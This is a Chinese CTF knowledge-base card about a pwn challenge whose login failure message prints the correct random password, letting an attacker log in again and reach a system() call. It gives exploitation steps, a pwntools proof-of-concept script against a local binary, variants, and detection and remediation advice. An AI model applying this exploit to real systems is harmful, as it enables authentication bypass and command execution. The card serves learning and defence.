---
id: ctf-pwn-login-failure-prints-correct-password
title: 登录失败分支打印正确随机密码：二次登录绕过并执行命令
type: scenario
domain: ctf
path: ctf/pwn
technique: verbose-auth-error-password-disclosure
aliases:
- 失败回显密码
- 正确密码泄露
- 二次登录绕过
- 调试输出泄露凭据
tags:
- ctf
- pwn
- auth-bypass
- logic-bug
- password-disclosure
- linux
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T09:47:27+08:00'
  notes: 已对照原文 pwn4 snake_manager 核对：/dev/urandom 生成16位密码、失败分支 printf 正确密码、二次登录后 system(buf) 与原文 exp 一致；未验证点：未本机复跑。
---

## 一句话结论

程序用 `/dev/urandom` 生成随机密码，但在“密码错误”分支直接把正确密码打印给用户；攻击者读取该密码后重新走一次登录流程即可通过校验，随后程序把用户输入交给 `system()` 执行，形成认证绕过到命令执行。

## 原理

- 示例程序用一个全局 `char crypto[0x30]` 保存 16 字节随机密码：从 `/dev/urandom` 读 16 字节，逐字节按 `charset` 取模映射成字母数字；密码本身不可预测。
- 登录逻辑中，用户名必须为 `admin`；密码比较失败时执行：
  ```c
  puts("Incorrect password.");
  printf("The correct password is: %s\n", crypto);   // 泄露点
  free(name);
  free(password);
  ```
  但 `crypto` 是全局变量，失败后没有被清零，主循环继续，攻击者可以直接用刚打印的密码再次登录。
- 成功分支设置 `sign = 1`，随后 `char buf[64]; read(0, buf, 128); system(buf);`，因此拿到密码即等于拿到命令执行。
- 另一个相关缺陷是 `int sign;` 未初始化：如果失败分支之后 `sign` 恰好为非零垃圾值，理论上可以不重新登录直接进入 `system` 分支；但该行为依赖栈内容，不如“读取打印的密码”稳定，示例利用选择后者。
- 根因是把“方便调试/提示用户”的明文回显留在了生产逻辑中，且秘密生命周期覆盖整个进程；这不是密码学问题，而是认证逻辑与信息泄露的组合。

## 触发条件

- 程序在认证失败路径打印或记录明文密码/密钥（日志、错误消息、调试输出、崩溃报告等）。
- 秘密在失败后仍然有效且未轮换；攻击者可以再次发起认证。
- 成功后有敏感操作（示例为 `system(user_input)`），或能读取 flag/执行命令。
- 攻击者能与程序交互（本地进程、远程服务或日志读取权限）。

## 利用步骤

1. 运行/连接目标，选择登录功能（示例菜单 `2`）。
2. 输入正确用户名 `admin` 和任意错误密码（示例 `12345`）。
3. 从输出中读取 `The correct password is: <password>`；密码为 16 位 `[a-zA-Z0-9]` 字符串。
4. 重新选择登录功能，用户名仍为 `admin`，密码填刚泄露的值。
5. 登录成功后程序进入命令输入，发送 `cat flag` 或 `sh` 等命令；示例直接 `system(buf)` 执行。
6. 若程序每次登录都重新生成密码，应在同一次失败输出后立即使用；若密码在失败时被释放/清零，则需改用未初始化标志位或其他路径。

## PoC

```python
from pwn import *
context.log_level = 'debug'
io = process('./server')

def cmd(choice):
    io.recvuntil(b'> ')
    io.sendline(str(choice).encode())

def login(name, password):
    io.recvuntil(b'Enter admin name:\n> ')
    io.sendline(name)
    io.recvuntil(b'Enter admin password:\n> ')
    io.sendline(password)

cmd(2)
login(b'admin', b'12345')                 # 任意错误密码
io.recvuntil(b'The correct password is: ')
password = io.recvline().strip()           # 服务端主动泄露
print('leaked password:', password)

cmd(2)
login(b'admin', password)                  # 用泄露的密码二次登录
io.send(b'cat flag\n')                     # system(buf)
io.interactive()
```

## 变体与关联

- 变体：失败分支不直接打印密码，但写入日志/审计文件/响应头，攻击者有日志读取权限时同样可利用。
- 变体：密码在失败后被 `free` 但未清零，后续堆分配可能读到残留明文；结合 UAF/未初始化读可恢复。
- 变体：未初始化 `sign` 等认证标志位被栈垃圾置为非零，直接跳过密码校验；这类问题应通过编译告警/静态分析发现。
- 关联卡片：[[web-generic-auth-error-message-username-enumeration]]（错误消息差异导致信息泄露）、[[binary-pwn-format-string-canary-leak-ret2copy-authorized-keys]]（另一类认证前信息泄露）、[[crypto-prng-glibc-rand-output-sequence-prediction]]（可预测随机数导致密码预测）。
- 边界：若程序在失败后立即轮换密码、退出进程或锁定账户，单纯回显不足以二次登录；若密码比较使用恒定时间且无回显，则本场景不成立。

## 检测与防御

- 检测：代码审计/SAST 搜索认证失败分支中的 `printf`/`puts`/日志调用，确认是否输出密码、token、密钥；动态测试用错误凭据观察响应是否包含秘密。
- 修复：失败响应只返回通用错误码，不包含任何秘密；密码/令牌不写入日志；失败后轮换一次性密码；初始化所有认证标志位（`int sign = 0;`）；登录成功后不要直接把用户输入交给 `system`。
- 加固：对认证接口做速率限制与告警；使用恒定时间比较；对敏感操作要求二次认证；生产构建移除调试输出。
